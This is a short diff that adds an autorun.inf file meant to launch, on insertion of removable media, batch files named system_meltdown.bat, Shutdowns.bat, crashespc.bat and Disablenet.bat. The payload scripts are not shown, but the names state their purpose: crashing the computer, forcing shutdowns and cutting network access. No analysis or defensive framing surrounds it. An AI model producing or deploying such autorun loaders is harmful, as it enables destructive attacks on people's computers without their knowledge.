@@ -1,0 +1,5 @@
+[autorun]
+open=system_meltdown.bat
+open=Shutdowns.bat
+open=crashespc.bat
+open=Disablenet.bat
